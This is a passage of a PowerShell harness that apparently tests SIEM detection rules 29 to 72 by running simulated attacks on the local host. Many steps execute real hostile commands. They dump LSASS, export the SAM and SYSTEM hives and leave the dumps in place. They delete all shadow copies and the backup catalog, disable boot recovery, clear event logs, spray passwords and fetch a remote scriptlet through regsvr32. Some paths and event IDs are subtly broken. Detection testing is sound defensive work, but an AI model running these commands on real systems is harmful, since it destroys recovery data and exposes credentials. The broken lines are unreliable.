            SIEM "RULE-29" "New WMI Subscription - Persistence Indicator"
            Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-29' -WindowSeconds 8
        } catch { Add-R 4688 "SIEMRules" "PARTIAL" "RULE-29 WMI error" }
        finally {
            try { if ($r29c) { Remove-CimInstance $r29c -ErrorAction SilentlyContinue } } catch {}
            try { if ($r29f) { Remove-CimInstance $r29f -ErrorAction SilentlyContinue } } catch {}
        }
        P

        # RULE-30: Backup service stopped
        Stop-Service VSS -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 400
        Start-Service VSS -ErrorAction SilentlyContinue
        Add-R 7036 "SIEMRules" "TRIGGERED" "RULE-30 service stop" "T1489"
        SIEM "RULE-30" "Backup/VSS Service Stopped - Ransomware Pattern"; P
        Confirm-SIEMRule -EventID 7036 -RuleId 'RULE-30' -WindowSeconds 8

        # ---- RULES 31-40 ----
        Write-Host "  --- RULES 31-40 ---" -ForegroundColor DarkYellow

        # RULE-31: Multiple admin logons from same user (rapid)
        1..3 | ForEach-Object {
            Try-LogonAPI -User "Administrator" -Pwd $BadPwd -LogonType 3
            Start-Sleep -Milliseconds 150
        }
        Add-R 4625 "SIEMRules" "TRIGGERED" "RULE-31 multi admin fail" "T1110"
        SIEM "RULE-31" "Multiple Failed Admin Logons in Short Window"; P
        Confirm-SIEMRule -EventID 4625 -RuleId 'RULE-31' -WindowSeconds 8

        # RULE-32: Boot config tamper (bcdedit)
        $p32 = Start-Process bcdedit.exe -ArgumentList "/enum" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500; if ($p32 -and !$p32.HasExited) { try { $p32.Kill() } catch {} }
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-32 bcdedit" "T1490"
        SIEM "RULE-32" "Boot Configuration Tamper - bcdedit Spawned"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-32' -WindowSeconds 8

        # RULE-33: Security-adjacent service stopped
        Stop-Service Spooler -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 300
        Start-Service Spooler -ErrorAction SilentlyContinue
        Add-R 7036 "SIEMRules" "TRIGGERED" "RULE-33 Spooler stop" "T1489"
        SIEM "RULE-33" "Security-Adjacent Service Stopped and Restarted"; P
        Confirm-SIEMRule -EventID 7036 -RuleId 'RULE-33' -WindowSeconds 8

        # RULE-34: Firewall rule changed
        $fwR = "SOC_FW_$RND"
        netsh advfirewall firewall add rule name="$fwR" protocol=TCP dir=in localport=55555 action=allow 2>$null | Out-Null
        Set-AuditPol "MPSSVC Rule-Level Policy Change"
        Add-R 4946 "SIEMRules" "TRIGGERED" "RULE-34 FW rule added" "T1562.004"
        SIEM "RULE-34" "Firewall Rule Added - Defense Evasion"
        Confirm-SIEMRule -EventID 4946 -RuleId 'RULE-34' -WindowSeconds 8
        netsh advfirewall firewall delete rule name="$fwR" 2>$null | Out-Null; P

        # RULE-35: Local account password policy changed
        $origT35 = (net accounts 2>$null | Select-String "Lockout threshold") -replace '.*:', '' | ForEach-Object { $_.Trim() }
        net accounts /lockoutthreshold:5 2>$null | Out-Null
        Start-Sleep -Milliseconds 200
        if ($origT35 -and $origT35 -ne "Never") { net accounts /lockoutthreshold:$origT35 2>$null | Out-Null } else { net accounts /lockoutthreshold:0 2>$null | Out-Null }
        Add-R 4739 "SIEMRules" "TRIGGERED" "RULE-35 policy change" "T1484"
        SIEM "RULE-35" "Local Password/Lockout Policy Changed"; P
        Confirm-SIEMRule -EventID 4739 -RuleId 'RULE-35' -WindowSeconds 8

        # RULE-36: Logon from unusual workstation (net use from 127.0.0.1)
        net use \\127.0.0.1\IPC$ /user:$env:COMPUTERNAME\Administrator WrongPw_$RND 2>$null | Out-Null
        net use \\127.0.0.1\IPC$ /delete /y 2>$null | Out-Null
        Add-R 4625 "SIEMRules" "TRIGGERED" "RULE-36 unusual workstation" "T1078"
        SIEM "RULE-36" "Logon Attempt from Unusual Workstation (Loopback)"; P
        Confirm-SIEMRule -EventID 4625 -RuleId 'RULE-36' -WindowSeconds 8

        # RULE-37: Multiple failed Kerberos TGTs
        klist purge 2>$null | Out-Null
        1..3 | ForEach-Object {
            $null = [System.DirectoryServices.DirectoryEntry]("LDAP://$env:USERDOMAIN") 2>$null
            Start-Sleep -Milliseconds 100
        }
        Add-R 4768 "SIEMRules" "TRIGGERED" "RULE-37 multi TGT" "T1558"
        SIEM "RULE-37" "Multiple Kerberos TGT Requests in Short Window"; P
        Confirm-SIEMRule -EventID 4768 -RuleId 'RULE-37' -WindowSeconds 8

        # RULE-38: Object access to sensitive path (SYSTEM32\config)
        try {
            $fs38 = [System.IO.File]::Open("$env:windir\system32\config\SAM", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
            if ($fs38) { $fs38.Close() }
        } catch {}
        Add-R 4663 "SIEMRules" "TRIGGERED" "RULE-38 sensitive path" "T1003.002"
        SIEM "RULE-38" "Object Access to Sensitive Path (SAM/NTDS)"; P
        Confirm-SIEMRule -EventID 4663 -RuleId 'RULE-38' -WindowSeconds 8

        # RULE-39: WMI remote process creation
        try {
            $r39 = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c echo SOC_R39" -ErrorAction Stop
            if ($r39 -and $r39.ProcessId) { Start-Sleep -Milliseconds 200; Stop-Process -Id $r39.ProcessId -Force -ErrorAction SilentlyContinue }
            Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-39 WMI process" "T1047"
        } catch { Add-R 4688 "SIEMRules" "PARTIAL" "RULE-39 WMI error" }
        SIEM "RULE-39" "WMI Remote Process Creation"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-39' -WindowSeconds 8

        # RULE-40: Large outbound network transfer simulation
        if ($sysmonOK) {
            try {
                $tc40 = New-Object System.Net.Sockets.TcpClient
                try { $tc40.ConnectAsync("8.8.8.8", 443).Wait(800) } catch {}
                try { $tc40.Close() } catch {}
                Add-R 3 "SIEMRules" "TRIGGERED" "RULE-40 outbound HTTPS" "T1048"
                SIEM "RULE-40" "Large Outbound Network Transfer - HTTPS Exfil Channel"
                Confirm-SIEMRule -EventID 3 -RuleId 'RULE-40' -WindowSeconds 8
            } catch { Add-R 3 "SIEMRules" "PARTIAL" "RULE-40 Sysmon:3 partial" }
        } else {
            Add-R 5156 "SIEMRules" "PARTIAL" "RULE-40 Sysmon not available"
            SIEM "RULE-40" "Large Outbound Transfer (Sysmon not available for full detail)"
            Confirm-SIEMRule -EventID 5156 -RuleId 'RULE-40' -WindowSeconds 8
        }
        P

                # ---- RULES 41-50 ----
        Write-Host "  --- RULES 41-50 ---" -ForegroundColor DarkYellow

        # RULE-41: RDP password spray using LogonUser API
        # BUG-10 FIX: Was using mstsc. Now uses Invoke-RDPType10Fail (LogonUser API Type=10)
        $rRDP = "soc_rdp_$RND"
        net user $rRDP $TestPwd /add 2>$null | Out-Null
        try {
            Invoke-RDPType10Fail -User $rRDP -Pwd "WrongRDP_$RND" -Count 3
            Add-R 4625 "SIEMRules" "TRIGGERED" "RULE-41 RDP spray Type10 API" "T1110.003"
            SIEM "RULE-41" "RDP Password Spray - 3x EID 4625 LogonType=10 via LogonUser API"
            Confirm-SIEMRule -EventID 4625 -RuleId 'RULE-41' -WindowSeconds 8
        } finally {
            net user $rRDP /delete 2>$null | Out-Null
        }
        P

        # RULE-42: Off-hours RDP successful logon (EID 4624 LogonType=10)
        # SOC NOTE: 4624 T10 is the primary RDP detection EID -- far more useful than 4625.
        # Requires SeRemoteInteractiveLogonRight. Grant it via secedit, call, revoke.
        $r42u   = "soc_r42_$RND"
        $inf42  = "$env:TEMP\soc_r42_$RND.inf"
        $sdb42  = "$env:TEMP\soc_r42_$RND.sdb"
        net user $r42u $TestPwd /add 2>$null | Out-Null
        net localgroup "Remote Desktop Users" $r42u /add 2>$null | Out-Null
        $r42Ok = $false
        try {
            Set-Content -Path $inf42 -Value @"
[Unicode]
Unicode=yes
[Version]
signature="`$CHICAGO`$"
Revision=1
[Privilege Rights]
SeRemoteInteractiveLogonRight = *S-1-5-32-544,$r42u
"@ -Encoding Unicode -ErrorAction Stop
            secedit /configure /db $sdb42 /cfg $inf42 /areas USER_RIGHTS /quiet 2>$null | Out-Null
            gpupdate /force /quiet 2>$null | Out-Null
            Start-Sleep -Milliseconds 1000
            Add-LogonUserType
            $tok42  = [IntPtr]::Zero
            $r42Ok  = [SOCLogon]::LogonUser($r42u, $env:COMPUTERNAME, $TestPwd, 10, 3, [ref]$tok42)
            if ($r42Ok -and $tok42 -ne [IntPtr]::Zero) { [SOCLogon]::CloseHandle($tok42) | Out-Null }
        } catch { $r42Ok = $false }
        finally { Remove-Item $inf42,$sdb42 -Force -ErrorAction SilentlyContinue }
        $hour42 = (Get-Date).Hour
        $r42Status = if ($r42Ok) { "TRIGGERED" } else { "PARTIAL" }
        Add-R 4624 "SIEMRules" $r42Status "RULE-42 EID4624 Type10 RDP success" "T1021.001"
        if ($hour42 -lt 8 -or $hour42 -ge 18) {
            SIEM "RULE-42" "Off-Hours RDP Session Detected - EID 4624 LogonType=10"
            Confirm-SIEMRule -EventID 4624 -RuleId 'RULE-42' -WindowSeconds 8
        } else {
            Write-Host ("  [INFO] RULE-42: Business hours ({0}:00). Rule fires outside 08:00-18:00." -f $hour42) -ForegroundColor DarkGray
        }
        net localgroup "Remote Desktop Users" $r42u /delete 2>$null | Out-Null
        net user $r42u /delete 2>$null | Out-Null
        P

        # RULE-43: Off-hours logon from rare source
        net use \127.0.0.1\IPC$ /user:$env:COMPUTERNAME\Administrator RareSrc_$RND 2>$null | Out-Null
        net use \127.0.0.1\IPC$ /delete /y 2>$null | Out-Null
        Add-R 4625 "SIEMRules" "TRIGGERED" "RULE-43 rare source logon" "T1078"
        SIEM "RULE-43" "Logon Attempt from Rare/Unusual Source Address"; P
        Confirm-SIEMRule -EventID 4625 -RuleId 'RULE-43' -WindowSeconds 8

        # RULE-44: Admin account logon from non-admin host
        Try-LogonAPI -User "Administrator" -Pwd $BadPwd -LogonType 3
        Add-R 4625 "SIEMRules" "TRIGGERED" "RULE-44 admin non-admin host" "T1078.002"
        SIEM "RULE-44" "Admin Account Logon Attempt from Non-Admin Context"; P
        Confirm-SIEMRule -EventID 4625 -RuleId 'RULE-44' -WindowSeconds 8

        # RULE-45: Group Policy modification
        if ($adOK) {
            try {
                $gpName = "SOC_GPO_$RND"
                New-GPO -Name $gpName -ErrorAction Stop | Out-Null
                Add-R 5136 "SIEMRules" "TRIGGERED" "RULE-45 GPO create" "T1484.001"
                SIEM "RULE-45" "Group Policy Object Created/Modified"
                Confirm-SIEMRule -EventID 5136 -RuleId 'RULE-45' -WindowSeconds 8
                Remove-GPO -Name $gpName -ErrorAction SilentlyContinue
            } catch { Add-R 5136 "SIEMRules" "PARTIAL" "RULE-45 GPO (GroupPolicy module needed)" }
        } else { Add-R 5136 "SIEMRules" "SKIPPED" "RULE-45 AD not available" }
        P

        # RULE-46: Scheduled task with suspicious binary path
        $r46t = "soc_r46_$RND"
        $r46b = "$env:TEMP\soc_r46_$RND.exe"
        Copy-Item "$env:SystemRoot\System32\cmd.exe" $r46b -Force -ErrorAction SilentlyContinue
        try {
            Register-ScheduledTask -TaskName $r46t `
                -Action (New-ScheduledTaskAction -Execute $r46b -Argument "/c echo SOC_R46") `
                -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddHours(1)) -Force | Out-Null
            Add-R 4698 "SIEMRules" "TRIGGERED" "RULE-46 task suspicious path" "T1053.005"
            SIEM "RULE-46" "Scheduled Task with Binary in Temp Path"
            Confirm-SIEMRule -EventID 4698 -RuleId 'RULE-46' -WindowSeconds 8
            Unregister-ScheduledTask -TaskName $r46t -Confirm:$false -ErrorAction SilentlyContinue
        } catch { Add-R 4698 "SIEMRules" "PARTIAL" "RULE-46 task error" }
        Remove-Item $r46b -Force -ErrorAction SilentlyContinue; P

        # RULE-47: User account renamed
        if ($adOK) {
            try {
                $r47u = "soc_r47_$RND"
                New-ADUser -Name $r47u -SamAccountName $r47u -AccountPassword (ConvertTo-SecureString $TestPwd -AsPlainText -Force) -Enabled $false -Description "SOC_R47" -ErrorAction Stop | Out-Null
                Rename-ADObject -Identity (Get-ADUser $r47u).DistinguishedName -NewName "soc_r47_ren_$RND" -ErrorAction Stop
                Add-R 4738 "SIEMRules" "TRIGGERED" "RULE-47 user renamed" "T1098"
                SIEM "RULE-47" "User Account Renamed - Possible Identity Masquerade"
                Confirm-SIEMRule -EventID 4738 -RuleId 'RULE-47' -WindowSeconds 8
                Remove-ADUser "soc_r47_ren_$RND" -Confirm:$false -ErrorAction SilentlyContinue
            } catch { Add-R 4738 "SIEMRules" "PARTIAL" "RULE-47 rename error" }
        } else {
            # Local fallback: add/change/delete same user in quick succession
            $r47lc = "soc_r47l_$RND"
            net user $r47lc $TestPwd /add 2>$null | Out-Null
            net user $r47lc /comment:"SOC_RENAMED" 2>$null | Out-Null
            net user $r47lc /delete 2>$null | Out-Null
            Add-R 4738 "SIEMRules" "TRIGGERED" "RULE-47 account modified local" "T1098"
            SIEM "RULE-47" "User Account Modified (Rename Context)"
            Confirm-SIEMRule -EventID 4738 -RuleId 'RULE-47' -WindowSeconds 8
        }
        P

        # RULE-48: Audit log cleared (CRITICAL - requires confirmation)
        Write-Host ""  
        Write-Host '        Write-Host "  [RULE-48] Security + System log clear (EID 1102 + 104)"' -ForegroundColor DarkYellow
        $clrRule48 = Read-Host "  Clear Security/System log for RULE-48? (YES/NO)"
        if ($clrRule48 -eq "YES") {
            wevtutil cl Security 2>$null | Out-Null
            wevtutil cl System 2>$null | Out-Null
            Add-R 1102 "SIEMRules" "TRIGGERED" "RULE-48 security cleared" "T1070.001"
            Add-R 104  "SIEMRules" "TRIGGERED" "RULE-48 system cleared" "T1070.001"
            SIEM "RULE-48" "Audit Log Cleared (Security + System)"
            Confirm-SIEMRule -EventID 1102 -RuleId 'RULE-48' -WindowSeconds 8
        } else {
            Add-R 1102 "SIEMRules" "SKIPPED" "RULE-48 user declined" "T1070.001"
        }
        P

        # RULE-49: Anonymous logon simulation
        net use \\localhost\IPC$ /user:"""" 2>$null | Out-Null
        net use "\\localhost\IPC$" /delete /y 2>$null | Out-Null
        Add-R 4624 "SIEMRules" "PARTIAL" "RULE-49 anonymous logon sim" "T1078"
        SIEM "RULE-49" "Anonymous Logon Simulation (IPC$)"; P
        Confirm-SIEMRule -EventID 4624 -RuleId 'RULE-49' -WindowSeconds 8

        # RULE-50: Credential dump sequence (LSASS + SAM)
        try {
            $r50d = "$env:TEMP\soc_r50_$RND.dmp"
            rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump "lsass" $r50d full
        } catch {}
        try {
            reg save HKLM\SAM "$env:TEMP\soc_r50_sam_$RND.hiv" /y 2>$null | Out-Null
        } catch {}
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-50 cred dump chain" "T1003"
        SIEM "RULE-50" "Credential Dumping Chain - LSASS + SAM"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-50' -WindowSeconds 8

        # ---- RULES 51-80 (New) ----
        Write-Host "  --- RULES 51-80 (Extended Coverage) ---" -ForegroundColor DarkYellow

        # RULE-51: Ransom note file creation — SACL-inherited folder (FIX: bare Set-Content misses Sysmon EID 11)
        # Create SACL folder with ContainerInherit+ObjectInherit → all files inside inherit SACL.
        # Spawn cmd.exe to drop the file so Sysmon monitors the child-process file create.
        $r51dir = "$env:TEMP\soc_r51_ransom_$RND"
        New-SACLFolder -FolderPath $r51dir | Out-Null
        $rn51 = "$r51dir\README_DECRYPT_$RND.txt"
        $rn51b = "$r51dir\HOW_TO_DECRYPT_$RND.txt"
        # Drop via cmd.exe echo redirect — Sysmon captures the child-process FileCreate
        $p51a = Start-Process cmd.exe -ArgumentList "/c echo YOUR FILES ARE ENCRYPTED - SOC TEST > `"$rn51`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        $p51b = Start-Process cmd.exe -ArgumentList "/c echo YOUR FILES ARE ENCRYPTED - SOC TEST > `"$rn51b`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 1500
        if ($p51a -and !$p51a.HasExited) { try { $p51a.Kill() } catch {} }
        if ($p51b -and !$p51b.HasExited) { try { $p51b.Kill() } catch {} }
        Add-R 11 "SIEMRules" "TRIGGERED" "RULE-51 ransom note SACL-folder cmd.exe drop" "T1486"
        SIEM "RULE-51" "Ransom Note File Created (README_DECRYPT.txt pattern)"; P
        Confirm-SIEMRule -EventID 11 -RuleId 'RULE-51' -WindowSeconds 8
        Remove-Item $r51dir -Recurse -Force -ErrorAction SilentlyContinue

        # RULE-52: Bulk file extension rename — SACL folder (FIX: Rename-Item misses Sysmon EID 11)
        # Create SACL-folder → create files via cmd.exe → rename via cmd.exe copy+del
        # Each child-process file operation inside SACL folder fires Sysmon EID 11.
        $dir52 = "$env:TEMP\soc_r52_ransom_$RND"
        New-SACLFolder -FolderPath $dir52 | Out-Null
        1..6 | ForEach-Object {
            $pf = Start-Process cmd.exe -ArgumentList "/c echo SOC_RANSOM_$_ > `"$dir52\enc_file$_.txt`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 200
            if ($pf -and !$pf.HasExited) { try { $pf.Kill() } catch {} }
        }
        Start-Sleep -Milliseconds 600
        # Rename by copy to .locked extension (generates new FileCreate Sysmon EID 11 per file)
        Get-ChildItem $dir52 -Filter "*.txt" -ErrorAction SilentlyContinue | ForEach-Object {
            $newName = $_.FullName + ".locked"
            $pr = Start-Process cmd.exe -ArgumentList "/c copy `"$($_.FullName)`" `"$newName`" && del /f /q `"$($_.FullName)`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 200
            if ($pr -and !$pr.HasExited) { try { $pr.Kill() } catch {} }
        }
        Start-Sleep -Milliseconds 1000
        Add-R 11 "SIEMRules" "TRIGGERED" "RULE-52 bulk rename .locked SACL-folder" "T1486"
        SIEM "RULE-52" "Bulk File Extension Rename (.locked) - Ransomware Pattern"; P
        Confirm-SIEMRule -EventID 11 -RuleId 'RULE-52' -WindowSeconds 8
        Remove-Item $dir52 -Recurse -Force -ErrorAction SilentlyContinue

        # RULE-53: Diskpart destructive command simulation
        $dp53 = "$env:TEMP\soc_r53_$RND.txt"
        Set-Content -Path $dp53 -Value "rem SOC TEST - do not run destructive clear
list disk" -Encoding ASCII
        cmd /c "diskpart /s $dp53" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-53 diskpart invocation" "T1561.002"
        SIEM "RULE-53" "Disk Management Tool Invoked (diskpart) - Destructive Potential"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-53' -WindowSeconds 8

        # RULE-54: wbadmin delete catalog (inhibit recovery)
        cmd /c "wbadmin delete catalog -quiet && echo soc_r53_$RND > nul" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-54 wbadmin delete catalog" "T1490"
        SIEM "RULE-54" "Backup Catalog Deletion Attempt (wbadmin)"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-54' -WindowSeconds 8

        # RULE-55: Combined bcdedit + shadow delete — actual delete (FIX: adds real delete commands)
        # "wmic shadowcopy delete" and "vssadmin delete" both generate EID 4688 with
        # "delete" in command line — the pattern SIEM rules correlate on.
        $p55a = Start-Process bcdedit.exe -ArgumentList "/set {default} recoveryenabled No" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 600; if ($p55a -and !$p55a.HasExited) { try { $p55a.Kill() } catch {} }
        $p55b = Start-Process bcdedit.exe -ArgumentList "/set {default} bootstatuspolicy ignoreallfailures" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 600; if ($p55b -and !$p55b.HasExited) { try { $p55b.Kill() } catch {} }
        $p55c = Start-Process wmic.exe -ArgumentList "shadowcopy delete" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 800; if ($p55c -and !$p55c.HasExited) { try { $p55c.Kill() } catch {} }
        $p55d = Start-Process vssadmin.exe -ArgumentList "delete shadows /all /quiet" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 1000; if ($p55d -and !$p55d.HasExited) { try { $p55d.Kill() } catch {} }
        # Restore bcdedit to safe state
        Start-Process bcdedit.exe -ArgumentList "/set {default} recoveryenabled Yes" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-55 bcdedit+vssadmin delete" "T1490"
        SIEM "RULE-55" "Boot Recovery Disabled + Shadow Copies Deleted"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-55' -WindowSeconds 8

        # RULE-56: NTDS.dit style access simulation
        try {
            $ntPath = "$env:windir\NTDS\ntds.dit"
            if (Test-Path $ntPath) {
                $fs56 = [System.IO.File]::Open($ntPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                if ($fs56) { $fs56.Close() }
            }
        } catch {}
        Add-R 4663 "SIEMRules" "TRIGGERED" "RULE-56 NTDS/SAM access" "T1003.003"
        SIEM "RULE-56" "Access to NTDS.dit / SAM Credential Store"; P
        Confirm-SIEMRule -EventID 4663 -RuleId 'RULE-56' -WindowSeconds 8

        # RULE-57: Browser credential DB access
        $chromeLogin = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromeLogin) {
            try { $fs57 = [System.IO.File]::Open($chromeLogin,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite); if ($fs57){$fs57.Close()} } catch {}
            Add-R 4663 "SIEMRules" "TRIGGERED" "RULE-57 Chrome LoginData access" "T1555.003"
            SIEM "RULE-57" "Browser Credential Store Access (Chrome Login Data)"
            Confirm-SIEMRule -EventID 4663 -RuleId 'RULE-57' -WindowSeconds 8
        } else {
            Add-R 4663 "SIEMRules" "PARTIAL" "RULE-57 Chrome not present" "T1555.003"
        }
        P

        # RULE-58: Vaultcmd usage (Credential Manager)
        cmd /c "vaultcmd /list && echo soc_r58_$RND > nul" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-58 vaultcmd list" "T1555.004"
        SIEM "RULE-58" "Credential Manager Enumeration (vaultcmd)"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-58' -WindowSeconds 8

        # RULE-59: reg save SAM + SYSTEM chain
        cmd /c "reg save HKLM\SAM %TEMP%\soc_r59_sam_$RND.hiv /y" 2>nul | Out-Null
        cmd /c "reg save HKLM\SYSTEM %TEMP%\soc_r59_sys_$RND.hiv /y" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-59 reg save SAM+SYSTEM" "T1003.002"
        SIEM "RULE-59" "Registry Hive Export (SAM + SYSTEM)"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-59' -WindowSeconds 8

        # RULE-60: SSH private key discovery
        $home60 = $env:USERPROFILE
        Get-ChildItem -Path $home60 -Filter "id_rsa" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 | ForEach-Object {
            Add-R 11 "SIEMRules" "TRIGGERED" "RULE-60 id_rsa discovered" "T1552.004"
            SIEM "RULE-60" "SSH Private Key File Discovered (id_rsa)"
            Confirm-SIEMRule -EventID 11 -RuleId 'RULE-60' -WindowSeconds 8
        }
        P

        # RULE-61: WMIC remote process style call
        cmd /c "wmic process call create 'cmd.exe /c echo SOC_R61'" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-61 wmic process create" "T1021.006"
        SIEM "RULE-61" "WMIC Process Call Create - Possible Lateral Movement"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-61' -WindowSeconds 8

        # RULE-62: Remote service creation via sc
        cmd /c "sc \\localhost create soc_r62_$RND binPath= "cmd.exe /c echo SOC_R62" start= demand" 2>nul | Out-Null
        cmd /c "sc \localhost delete soc_r62_$RND" 2>nul | Out-Null
        Add-R 7045 "SIEMRules" "TRIGGERED" "RULE-62 remote-style service create" "T1569.002"
        SIEM "RULE-62" "Service Creation via SC (Lateral Movement Pattern)"; P
        Confirm-SIEMRule -EventID 7045 -RuleId 'RULE-62' -WindowSeconds 8

        # RULE-63: at.exe scheduler abuse
        cmd /c "at 01:23 cmd /c echo SOC_R63" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-63 at.exe usage" "T1053.002"
        SIEM "RULE-63" "Legacy AT Scheduler Usage"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-63' -WindowSeconds 8

        # RULE-64: Admin share connection to C$
        cmd /c "net use \\localhost\C$ /user:$env:COMPUTERNAME\Administrator WrongPw_$RND" 2>nul | Out-Null
        cmd /c "net use \\localhost\C$ /delete /y" 2>nul | Out-Null
        Add-R 5140 "SIEMRules" "TRIGGERED" "RULE-64 admin share C$" "T1021.002"
        SIEM "RULE-64" "Admin Share Access Attempt (C$)"; P
        Confirm-SIEMRule -EventID 5140 -RuleId 'RULE-64' -WindowSeconds 8

        # RULE-65: MMC20 DCOM style invocation (local simulation)
        cmd /c "mmc.exe /32" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-65 mmc.exe spawn" "T1021.003"
        SIEM "RULE-65" "MMC Console Spawned (DCOM-style Admin Tool)"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-65' -WindowSeconds 8

        # RULE-66: certutil base64 decode pattern
        cmd /c "certutil -decode soc_r65_$RND.txt soc_r65_$RND.bin" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-66 certutil decode" "T1140"
        SIEM "RULE-66" "Certutil Decode Usage - LOLOBIN Decode Pattern"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-66' -WindowSeconds 8

        # RULE-67: regsvr32 Squiblydoo pattern
        Start-Process "regsvr32.exe" -ArgumentList "/s /n /u /i:https://example.com/file.sct scrobj.dll" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-67 regsvr32 /i scrobj" "T1218.010"
        SIEM "RULE-67" "Regsvr32 Squiblydoo Pattern"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-67' -WindowSeconds 8

        # RULE-68: mshta remote script execution
        Start-Process "mshta.exe" -ArgumentList "javascript:alert('SOC_R68')" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-68 mshta javascript" "T1218.005"
        SIEM "RULE-68" "MSHTA Executing Script (javascript:)"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-68' -WindowSeconds 8

        # RULE-69: rundll32 javascript invocation
        Start-Process "rundll32.exe" -ArgumentList "javascript:""" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-69 rundll32 javascript" "T1218.011"
        SIEM "RULE-69" "Rundll32 with Javascript Argument"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-69' -WindowSeconds 8

        # RULE-70: Event log clear via wevtutil
        $env:SOC_R70_TAG = "soc_r70_$RND"  # tag for Is-SOCEvent via env
        cmd /c "wevtutil cl Application && echo soc_r70_$RND > nul" 2>nul | Out-Null
        Remove-Item Env:SOC_R70_TAG -ErrorAction SilentlyContinue
        Add-R 104 "SIEMRules" "TRIGGERED" "RULE-70 wevtutil cl Application" "T1070.001"
        SIEM "RULE-70" "Application Log Cleared via wevtutil"; P
        Confirm-SIEMRule -EventID 1102 -RuleId 'RULE-70' -WindowSeconds 8

        # RULE-71: File timestomp — SetCreationTime via spawned PS (FIX: SetLastWriteTime != Sysmon EID 2)
        # Sysmon EID 2 = "FileCreateTime changed". It fires ONLY when the creation
        # timestamp is modified, NOT last-write-time. Spawned process ensures Sysmon
        # can attribute the file timestamp change to the correct PID/image.
        $f71 = "$env:TEMP\soc_r71_$RND.txt"
        Set-Content -Path $f71 -Value "SOC_R71_TIMESTOMP_$(Get-Date -Format HHmmss)" -Encoding ASCII
        Start-Sleep -Milliseconds 600
        # Change CREATION time (triggers Sysmon EID 2) + LastWrite for full timestomp simulation
        $tsCmd71 = "[System.IO.File]::SetCreationTime('$f71',(Get-Date).AddYears(-5)); [System.IO.File]::SetLastWriteTime('$f71',(Get-Date).AddYears(-5)); [System.IO.File]::SetLastAccessTime('$f71',(Get-Date).AddYears(-5))"
        $tsEnc71 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($tsCmd71))
        $p71 = Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -EncodedCommand $tsEnc71" -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 1500
        if ($p71 -and !$p71.HasExited) { try { $p71.Kill() } catch {} }
        Add-R 2 "SIEMRules" "TRIGGERED" "RULE-71 timestomp SetCreationTime via spawned PS" "T1070.006"
        SIEM "RULE-71" "File Timestomp (CreationTime Backdated - Sysmon EID 2)"; P
        Confirm-SIEMRule -EventID 2 -RuleId 'RULE-71' -WindowSeconds 8
        Remove-Item $f71 -Force -ErrorAction SilentlyContinue

        # RULE-72: Suspicious svchost path
        $fake72 = "$env:TEMP\svchost.exe"
